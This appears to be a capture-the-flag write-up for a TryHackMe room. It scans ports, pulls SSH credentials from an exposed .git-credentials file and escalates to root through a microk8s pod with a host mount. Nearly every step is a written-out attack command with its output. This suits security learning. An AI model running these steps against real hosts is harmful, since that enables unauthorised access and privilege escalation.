# Frank & Herby make an app|Writeup-TryHackMe|medium
 # this is a solution for Frank and Herby try again.... room on <font color="&#x1F4D8;">https://tryhackme.com</font>   
 # URl: <font color="&#x1F4D8;"> https://tryhackme.com/room/frankandherby </font>

# Task 1 "Frank & Herb Make an App!"
 # 1st question
 The question begins asking us what port with a web application listening is open on the machine.
 to know that we have to  run **rustscan** on the **machine_ip**  then we get a list of open ports 
 write the next line in your terminal to create the scan "rustscan -a machine_ip --ulimit 3000"
 **after we create the scan we found that:** 
````

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
10250/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
10255/tcp open  http     Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
25000/tcp open  ssl/http Gunicorn 19.7.1
31337/tcp open  http     nginx 1.21.3
32000/tcp open  unknown 

````
**If we look carefully there is only one port that fits what we need. Alternatively you can visit each of them in the browser until you find the one that connects.**

 # 2nd question
now we  will use gobuster to discover what other directories there  using the port number from 1st question
```` gobuster -e -u  $machine_ip:31337 -w -w /usr/share/wordlists/dirb/common.txt ````
**the output for that scan is:** 
````
http://machine_ip/.git-credentials
http://machine_ip/assets
http://machine_ip/css
http://machine_ip/index.html
http://machine_ip/vendor

````
the answer will be the first directory :**.git-credentials**
#3rd question
after that we will curl on the first ip address:````curl $machine_ip:31337/.git-credentials````
the output is ````http://frank:PASSWORD@192.168.100.50````
and these credentials allow us  access through SSH using this coomand ````ssh frank@$machine_ip````
after we access to the machine we will use the ````ls```` command to list all files in the machine 
after that  we have found two folders and one text file  **the flag will be in the text file**
# 4th question
 in this question we have to access using root 
 we may try to run ````sudo -l```` to see what frank can run as ````sudo```` with.
 unfortunately, frank is neither in the sudoers file nor the ````sudo```` group.
 but after some search i noticed that the trick of this room is There is microk8s on the machine used to deploy the app.
 now we  can list all the relevant deployments, pods etc. ````with microk8s kubectl get all````
````
frank@dev-01:~$ microk8s kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          11d
````
So we've found a running pod, but this doesn't give us the image definition used to build its containers - this requires another kubectl command to output the pod's configuration in yaml, revealing an image available at a local registry running on localhost:32000 :
````
frank@dev-01:~$ microk8s kubectl get pod nginx-deployment-7b548976fd-77v4r -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    cni.projectcalico.org/podIP: 10.1.133.238/32
...snip...
spec:
  containers:
  - image: localhost:32000/bsnginx
    imagePullPolicy: Always
````
We can use this image in a revised version of the pod configuration file included above. Start by changing the "image" key of this file from "ubuntu:latest" to "localhost:32000/bsnginx" and save the resulting file as "exploit.yaml". We can now follow the exploit POC, applying the new pod definition to the cluster :
````
frank@dev-01:~$ microk8s kubectl apply -f exploit.yaml
pod/hostmount created
````
and now  create a shell session in the new container
````
frank@dev-01:~$ microk8s kubectl exec -it hostmount /bin/bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@hostmount:/# ls /opt/root/root
root.txt  snap
````
The root flag is at /opt/root/root/root.txt (i.e. /root/root.txt on the host machine).
